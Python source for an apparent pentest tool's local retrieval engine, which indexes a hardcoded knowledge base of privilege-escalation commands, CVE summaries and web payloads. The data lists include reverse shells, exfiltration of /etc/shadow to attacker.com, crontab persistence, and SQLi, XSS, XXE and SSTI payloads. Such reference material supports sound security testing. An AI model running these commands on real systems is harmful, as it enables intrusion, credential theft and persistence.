"""
Kvasir — Local RAG (Retrieval-Augmented Generation) Engine
Provides offline knowledge lookups for privilege escalation vectors,
exploit techniques, and payload references using ChromaDB + Ollama embeddings.
Named after Kvasir, the wisest being in Norse mythology.
"""
import os
import requests
import re
try:
    import yaml
except ImportError:
    yaml = None
OLLAMA_BASE = "http://localhost:11434"
RAG_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), "rag_data")
EMBED_MODEL = "nomic-embed-text"  # Lightweight, good embeddings
GTFOBINS_KB = [
    {"binary": "find", "category": "file-read", "description": "Read files using find's -exec flag", "command": "find . -exec cat /etc/shadow \\; -quit", "shell": True, "sudo": False},
    {"binary": "vim", "category": "shell", "description": "Escape to shell from Vim", "command": "vim -c ':!/bin/sh'", "shell": True, "sudo": False},
    {"binary": "awk", "category": "shell", "description": "Spawn shell via awk", "command": "awk 'BEGIN {system(\"/bin/sh\")}'", "shell": True, "sudo": False},
    {"binary": "python", "category": "shell", "description": "Python interactive shell escape", "command": "python -c 'import pty; pty.spawn(\"/bin/sh\")'", "shell": True, "sudo": False},
    {"binary": "perl", "category": "shell", "description": "Perl shell escape", "command": "perl -e 'exec \"/bin/sh\"'", "shell": True, "sudo": False},
    {"binary": "nmap", "category": "shell", "description": "Nmap interactive mode escape (old versions)", "command": "nmap --interactive\n!sh", "shell": True, "sudo": False},
    {"binary": "less", "category": "shell", "description": "Shell escape from less pager", "command": "less /etc/passwd\n!/bin/sh", "shell": True, "sudo": False},
    {"binary": "man", "category": "shell", "description": "Shell escape from man pager", "command": "man man\n!/bin/sh", "shell": True, "sudo": False},
    {"binary": "git", "category": "shell", "description": "Git pager shell escape", "command": "git -p help\n!/bin/sh", "shell": True, "sudo": False},
    {"binary": "tar", "category": "file-read", "description": "Read files by archiving them to stdout", "command": "tar cf - /etc/shadow | tar xf - -O", "shell": False, "sudo": True},
    {"binary": "wget", "category": "file-upload", "description": "Exfiltrate files via HTTP POST", "command": "wget --post-file=/etc/shadow http://attacker.com/", "shell": False, "sudo": False},
    {"binary": "curl", "category": "file-upload", "description": "Exfiltrate files via HTTP POST", "command": "curl -X POST -d @/etc/shadow http://attacker.com/", "shell": False, "sudo": False},
    {"binary": "nc", "category": "reverse-shell", "description": "Netcat reverse shell", "command": "nc -e /bin/sh attacker.com 4444", "shell": False, "sudo": False},
    {"binary": "bash", "category": "reverse-shell", "description": "Bash TCP reverse shell", "command": "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1", "shell": False, "sudo": False},
    {"binary": "socat", "category": "reverse-shell", "description": "Socat PTY reverse shell", "command": "socat exec:'bash -li',pty,stderr tcp:10.0.0.1:4444", "shell": False, "sudo": False},
    {"binary": "ssh", "category": "file-read", "description": "Read local files via SSH localhost", "command": "ssh -o ProxyCommand='cat /etc/shadow' localhost", "shell": False, "sudo": False},
    {"binary": "cp", "category": "file-write", "description": "Overwrite sensitive files (shadow, sudoers)", "command": "cp /tmp/evil_passwd /etc/passwd", "shell": False, "sudo": True},
    {"binary": "chmod", "category": "permission", "description": "Add SUID bit to binary", "command": "chmod u+s /bin/bash", "shell": False, "sudo": True},
    {"binary": "docker", "category": "shell", "description": "Escape container via mounted volume", "command": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh", "shell": False, "sudo": False},
    {"binary": "crontab", "category": "persistence", "description": "Add reverse shell to crontab", "command": "echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"' | crontab -", "shell": False, "sudo": False},
]
EXPLOITDB_KB = [
    {"id": "CVE-2021-4034", "name": "PwnKit (Polkit Privilege Escalation)", "type": "local", "platform": "linux", "description": "Polkit pkexec local privilege escalation. Affects most Linux distributions 2009-2021.", "cvss": 7.8},
    {"id": "CVE-2019-14287", "name": "Sudo Bypass (User -1)", "type": "local", "platform": "linux", "description": "Sudo security bypass via user ID -1. Affects sudo < 1.8.28.", "cvss": 7.8},
    {"id": "CVE-2021-3156", "name": "Baron Samedit (Sudo Heap Overflow)", "type": "local", "platform": "linux", "description": "Sudo heap-based buffer overflow. Affects sudo 1.8.2-1.8.31p1 and 1.9.0-1.9.5p1.", "cvss": 7.8},
    {"id": "CVE-2016-5195", "name": "DirtyCow (Kernel COW Race Condition)", "type": "local", "platform": "linux", "description": "Linux kernel memory subsystem copy-on-write race condition. Kernel < 4.8.3.", "cvss": 7.8},
    {"id": "CVE-2022-0847", "name": "DirtyPipe (Linux Kernel Pipe)", "type": "local", "platform": "linux", "description": "Linux kernel pipe flag overwrite. Kernel 5.8-5.16.11.", "cvss": 7.8},
    {"id": "CVE-2020-1472", "name": "ZeroLogon (Netlogon)", "type": "remote", "platform": "windows", "description": "Netlogon cryptographic vulnerability allowing domain admin elevation.", "cvss": 10.0},
    {"id": "CVE-2019-0708", "name": "BlueKeep (RDP RCE)", "type": "remote", "platform": "windows", "description": "Remote Desktop Services remote code execution. Windows 7 / Server 2008 R2.", "cvss": 9.8},
    {"id": "CVE-2017-0144", "name": "EternalBlue (SMBv1 RCE)", "type": "remote", "platform": "windows", "description": "SMBv1 remote code execution. Exploited by WannaCry.", "cvss": 9.8},
    {"id": "CVE-2023-23397", "name": "Outlook NTLM Leak", "type": "remote", "platform": "windows", "description": "Microsoft Outlook privilege escalation via crafted email with UNC path.", "cvss": 9.8},
    {"id": "CVE-2021-36934", "name": "HiveNightmare (SAM File Read)", "type": "local", "platform": "windows", "description": "Windows SAM database readable by non-admin users via shadow copy.", "cvss": 7.8},
]
PAYLOADS_KB = [
    {"name": "Basic SQLi (Auth Bypass)", "category": "sqli", "payload": "' OR '1'='1' --", "context": "Login form username field"},
    {"name": "Union-based SQLi", "category": "sqli", "payload": "' UNION SELECT NULL,username,password FROM users--", "context": "URL parameter, 3 columns"},
    {"name": "Time-based Blind SQLi", "category": "sqli", "payload": "'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '00:00:05'--", "context": "MSSQL parameter"},
    {"name": "Basic XSS (Reflected)", "category": "xss", "payload": "<script>alert(1)</script>", "context": "Search/input field with reflected value"},
    {"name": "XSS (IMG onerror)", "category": "xss", "payload": "<img src=x onerror=alert(document.cookie)>", "context": "Filter bypass when <script> is blocked"},
    {"name": "XSS (SVG vector)", "category": "xss", "payload": "<svg onload=alert(1)>", "context": "Bypass when HTML tags are stripped but SVG allowed"},
    {"name": "LFI (Path Traversal)", "category": "lfi", "payload": "../../../../etc/passwd", "context": "File include parameter, Linux target"},
    {"name": "LFI (PHP Wrapper)", "category": "lfi", "payload": "php://filter/convert.base64-encode/resource=index.php", "context": "PHP file include, read source code"},
    {"name": "Command Injection", "category": "rce", "payload": "; id", "context": "Shell command injection in form field"},
    {"name": "Command Injection (Blind)", "category": "rce", "payload": "$(sleep 10)", "context": "Blind command injection, time-based detection"},
    {"name": "XXE (External Entity)", "category": "xxe", "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", "context": "XML input field"},
    {"name": "SSTI (Jinja2/Twig)", "category": "ssti", "payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "context": "Server-side template injection, Python/Flask"},
]
try:
    import chromadb
    from chromadb.config import Settings
    CHROMADB_AVAILABLE = True
except ImportError:
    CHROMADB_AVAILABLE = False
def _get_chroma_client():
    """Get or create persistent ChromaDB client."""
    os.makedirs(RAG_DIR, exist_ok=True)
    return chromadb.PersistentClient(
        path=os.path.join(RAG_DIR, "chroma"),
        settings=Settings(anonymized_telemetry=False)
    )
def _get_embedding(text):
    """Get embedding vector from Ollama for a text string."""
    try:
        resp = requests.post(
            f"{OLLAMA_BASE}/api/embeddings",
            json={"model": EMBED_MODEL, "prompt": text},
            timeout=30
        )
        if resp.status_code == 200:
            embedding = resp.json().get("embedding", [])
            if embedding and len(embedding) > 0:
                return embedding
    except Exception:
        pass
    return None
def check_rag_status():
    """Check if ChromaDB and Ollama embedding model are available."""
    result = {
        "chromadb_available": CHROMADB_AVAILABLE,
        "ollama_available": False,
        "embed_model_available": False,
        "collections": [],
        "total_documents": 0,
        "offline_fallback": True
    }
    try:
        resp = requests.get(f"{OLLAMA_BASE}/api/tags", timeout=5)
        if resp.status_code == 200:
            result["ollama_available"] = True
            models = [m["name"] for m in resp.json().get("models", [])]
            result["embed_model_available"] = any(
                EMBED_MODEL in m for m in models
            )
    except Exception:
        pass
    if CHROMADB_AVAILABLE:
        try:
            client = _get_chroma_client()
            collections = client.list_collections()
            result["collections"] = [c.name for c in collections]
            result["total_documents"] = sum(c.count() for c in collections)
        except Exception:
            pass
    return result
def index_knowledge_base():
    """
    Index the built-in knowledge base into ChromaDB.
    Pulls nomic-embed-text if available, else falls back gracefully.
    """
    if not CHROMADB_AVAILABLE:
        return {
            "status": "error",
            "message": "ChromaDB not installed. Run: pip install chromadb"
        }
    status = check_rag_status()
    if not status["ollama_available"]:
        return {
            "status": "error",
            "message": "Ollama not running. Start with: ollama serve"
        }
    if not status["embed_model_available"]:
        import subprocess
        try:
            subprocess.Popen(
                ["ollama", "pull", EMBED_MODEL],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            return {
                "status": "error",
                "message": f"Embedding model '{EMBED_MODEL}' is being pulled. Please wait and retry indexing in a few minutes."
            }
        except Exception:
            return {
                "status": "error",
                "message": f"Please pull the embedding model first: ollama pull {EMBED_MODEL}"
            }
    try:
        client = _get_chroma_client()
        results = {}
        results["gtfobins"] = _index_collection(
            client, "gtfobins", GTFOBINS_KB,
            doc_formatter=lambda d: (
                f"Binary: {d['binary']}\n"
                f"Category: {d['category']}\n"
                f"Description: {d['description']}\n"
                f"Command: {d['command']}\n"
                f"Requires shell: {d.get('shell', False)}\n"
                f"Requires sudo: {d.get('sudo', False)}"
            ),
            metadata_keys=["binary", "category", "shell", "sudo"]
        )
        results["exploitdb"] = _index_collection(
            client, "exploitdb", EXPLOITDB_KB,
            doc_formatter=lambda d: (
                f"CVE: {d['id']}\n"
                f"Name: {d['name']}\n"
                f"Type: {d['type']}\n"
                f"Platform: {d['platform']}\n"
                f"Description: {d['description']}\n"
                f"CVSS Score: {d.get('cvss', 'N/A')}"
            ),
            metadata_keys=["id", "type", "platform", "cvss"]
        )
        results["payloads"] = _index_collection(
            client, "payloads", PAYLOADS_KB,
            doc_formatter=lambda d: (
                f"Name: {d['name']}\n"
                f"Category: {d['category']}\n"
                f"Payload: {d['payload']}\n"
                f"Context: {d['context']}"
            ),
            metadata_keys=["name", "category"]
        )
        total = sum(r["count"] for r in results.values())
        return {
            "status": "success",
            "message": f"Indexed {total} documents across {len(results)} collections.",
            "collections": results
        }
    except Exception as e:
        return {"status": "error", "message": f"Indexing failed: {str(e)}"}
def _index_collection(client, name, documents, doc_formatter, metadata_keys):
    """Index a list of documents into a ChromaDB collection."""
    try:
        client.delete_collection(name)
    except Exception:
        pass
    collection = client.create_collection(name=name)
    ids = []
    docs = []
    metadatas = []
    for i, doc in enumerate(documents):
        doc_id = f"{name}_{i}"
        ids.append(doc_id)
        docs.append(doc_formatter(doc))
        meta = {k: doc.get(k) for k in metadata_keys if k in doc}
        metadatas.append(meta)
    collection.add(ids=ids, documents=docs, metadatas=metadatas)
    return {"name": name, "count": len(documents)}
def query_knowledge(query, collections=None, top_k=5):
    """
    Search the RAG knowledge base for relevant information.
    Falls back to keyword search if ChromaDB/Ollama unavailable.
    Args:
        query: str — natural language question
        collections: list — which collections to search (default all)
        top_k: int — number of results per collection
    Returns:
        dict with results and metadata
    """
    status = check_rag_status()
    if status["chromadb_available"] and status["embed_model_available"]:
        return _vector_search(query, collections, top_k)
    return _keyword_search(query, top_k)
def _vector_search(query, collections, top_k):
    """Full vector similarity search via ChromaDB + Ollama embeddings."""
    embedding = _get_embedding(query)
    if not embedding:
        return _keyword_search(query, top_k)
    client = _get_chroma_client()
    all_collections = [c.name for c in client.list_collections()]
    target = collections if collections else all_collections
    results = {}
    for col_name in target:
        if col_name not in all_collections:
            continue
        try:
            col = client.get_collection(name=col_name)
            qr = col.query(query_embeddings=[embedding], n_results=min(top_k, 10))
            docs = qr.get("documents", [[]])[0]
            metas = qr.get("metadatas", [[]])[0]
            distances = qr.get("distances", [[]])[0]
            results[col_name] = []
            for i, doc in enumerate(docs):
                results[col_name].append({
                    "content": doc,
                    "metadata": metas[i] if i < len(metas) else {},
                    "score": round(1.0 - (distances[i] if i < len(distances) else 0), 4)
                })
        except Exception:
            continue
    return {
        "status": "success",
        "method": "vector",
        "query": query,
        "results": results,
        "total_hits": sum(len(v) for v in results.values())
    }
def _keyword_search(query, top_k):
    """Simple keyword-based search as offline fallback."""
    query_lower = query.lower()
    keywords = query_lower.split()
    results = {}
    gtfobins_hits = []
    for d in GTFOBINS_KB:
        score = sum(
            3 if kw in d.get("binary", "").lower() else
            2 if kw in d.get("category", "").lower() else
            1 if kw in d.get("description", "").lower() else 0
            for kw in keywords
        )
        if score > 0:
            gtfobins_hits.append({
                "content": (
                    f"Binary: {d['binary']}\nCategory: {d['category']}\n"
                    f"Description: {d['description']}\nCommand: {d['command']}"
                ),
                "metadata": {"binary": d["binary"], "category": d["category"]},
                "score": min(score / (len(keywords) * 3), 1.0)
            })
    gtfobins_hits.sort(key=lambda x: x["score"], reverse=True)
    if gtfobins_hits:
        results["gtfobins"] = gtfobins_hits[:top_k]
    exploitdb_hits = []
    for d in EXPLOITDB_KB:
        score = sum(
            3 if kw in d.get("id", "").lower() or kw in d.get("name", "").lower() else
            2 if kw in d.get("type", "").lower() or kw in d.get("platform", "").lower() else
            1 if kw in d.get("description", "").lower() else 0
            for kw in keywords
        )
        if score > 0:
            exploitdb_hits.append({
                "content": (
                    f"CVE: {d['id']}\nName: {d['name']}\n"
                    f"Type: {d['type']} | Platform: {d['platform']}\n"
                    f"Description: {d['description']}"
                ),
                "metadata": {"id": d["id"], "type": d["type"], "platform": d["platform"]},
                "score": min(score / (len(keywords) * 3), 1.0)
            })
    exploitdb_hits.sort(key=lambda x: x["score"], reverse=True)
    if exploitdb_hits:
        results["exploitdb"] = exploitdb_hits[:top_k]
    payload_hits = []
    for d in PAYLOADS_KB:
        score = sum(
            3 if kw in d.get("name", "").lower() or kw in d.get("category", "").lower() else
            2 if kw in d.get("payload", "").lower() else
            1 if kw in d.get("context", "").lower() else 0
            for kw in keywords
        )
        if score > 0:
            payload_hits.append({
                "content": (
                    f"Name: {d['name']}\nCategory: {d['category']}\n"
                    f"Payload: {d['payload']}\nContext: {d['context']}"
                ),
                "metadata": {"name": d["name"], "category": d["category"]},
                "score": min(score / (len(keywords) * 3), 1.0)
            })
    payload_hits.sort(key=lambda x: x["score"], reverse=True)
    if payload_hits:
        results["payloads"] = payload_hits[:top_k]
    return {
        "status": "success",
        "method": "keyword" if results else "none",
        "query": query,
        "results": results,
        "total_hits": sum(len(v) for v in results.values()),
        "offline": True
    }
def fetch_gtfobins_live():
    """
    Fetch the latest GTFOBins data from the official GitHub repository.
    Parses YAML front-matter from markdown files and indexes into the KB.
    Returns:
        dict with status and count of fetched entries
    """
    GTFOBINS_RAW_URL = "https://raw.githubusercontent.com/GTFOBins/GTFOBins.github.io/master/_gtfobins"
    try:
        resp = requests.get(
            "https://api.github.com/repos/GTFOBins/GTFOBins.github.io/contents/_gtfobins",
            timeout=15,
            headers={"Accept": "application/vnd.github.v3+json"}
        )
        if resp.status_code != 200:
            return {"status": "error", "message": f"GitHub API error (HTTP {resp.status_code}). Try again later."}
        entries = resp.json()
        new_entries = []
        count = 0
        for entry in entries[:50]:  # Limit to 50 to avoid rate limits
            if not entry["name"].endswith(".md"):
                continue
            try:
                md_resp = requests.get(entry["download_url"], timeout=10)
                if md_resp.status_code != 200:
                    continue
                content = md_resp.text
                binary_name = entry["name"].replace(".md", "")
                front_match = re.match(r'^---\s*\n(.*?)\n---', content, re.DOTALL)
                if not front_match:
                    continue
                front = front_match.group(1)
                try:
                    if yaml:
                        data = yaml.safe_load(front)
                    else:
                        raise ImportError("yaml not installed")
                except Exception:
                    data = {}
                    for line in front.split("\n"):
                        kv = line.split(":", 1)
                        if len(kv) == 2:
                            data[kv[0].strip()] = kv[1].strip()
                desc = str(data.get("description", ""))[:200]
                functions = data.get("functions", [{}])
                for func in (functions if isinstance(functions, list) else [functions]):
                    cat = func.get("description", data.get("description", ""))[:80] if isinstance(func, dict) else str(func)[:80]
                    cmd_list = []
                    if isinstance(func, dict):
                        cmd_list = func.get("code", [])
                        if isinstance(cmd_list, str):
                            cmd_list = [cmd_list]
                    for code in (cmd_list if cmd_list else [""]):
                        if isinstance(code, dict):
                            code = code.get("code", str(code))
                        code_str = str(code).strip()[:500]
                        if code_str:
                            new_entries.append({
                                "binary": binary_name,
                                "category": "gtfobins-live",
                                "description": f"{desc} — {cat}",
                                "command": code_str,
                                "shell": "shell" in str(func).lower(),
                                "sudo": "sudo" in str(code).lower()
                            })
                            count += 1
            except Exception:
                continue
        if new_entries:
            existing_keys = {(e["binary"], e["command"]) for e in GTFOBINS_KB}
            for e in new_entries:
                if (e["binary"], e["command"]) not in existing_keys:
                    GTFOBINS_KB.append(e)
                    existing_keys.add((e["binary"], e["command"]))
        return {
            "status": "success",
            "message": f"Fetched {count} entries from GTFOBins GitHub. Total KB: {len(GTFOBINS_KB)} entries.",
            "fetched": count,
            "total_entries": len(GTFOBINS_KB)
        }
    except requests.Timeout:
        return {"status": "error", "message": "Timeout fetching GTFOBins data. GitHub may be unreachable."}
    except Exception as e:
        return {"status": "error", "message": f"Fetch failed: {str(e)}"}
